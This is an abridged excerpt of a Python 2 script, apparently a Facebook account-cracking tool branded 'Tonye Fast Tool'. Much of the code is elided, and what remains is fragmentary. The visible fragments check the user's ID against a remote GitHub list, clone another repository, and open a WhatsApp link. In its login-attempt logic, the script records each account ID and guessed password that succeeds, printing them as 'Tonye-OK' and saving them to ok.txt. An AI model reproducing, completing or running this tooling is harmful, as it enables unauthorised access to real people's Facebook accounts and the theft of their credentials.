...
def mohammad():
    ...
    try:
        httpCaht = requests.get('https://github.com/ICE-H4CKER/Old/blob/main/public.txt').text
        if id in httpCaht:
...
def method_menu_select():
    ...
    if afza == '1':
        ...
        os.system('cd $HOME && git clone https://github.com/Ghostson/Ghostson')
...
def b_menu_select():
    ...
    print ''
    os.system('echo -e "Created by Tonye Fast Tool\n\n\t   \n" | lolcat')
    time.sleep(5)
                            ...
                            if 'www.facebook.com' in d['error_msg']:
                                ...
                                if 'www.facebook.com' in d['error_msg']:
                                    ...
                                    if 'www.facebook.com' in d['error_msg']:
                                        ...
                                        print '\r\x1b[0;92mTonye-OK ' + uid + ' - ' + pass8
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass8 + '\n')
                                        ok.close()
                                        oks.append(uid)
...
if __name__ == '__main__':
    ...
    time.sleep(2)
    print ' '
    os.system('xdg-open https://wa.me/+23490758')
    time.sleep(10)
    ip()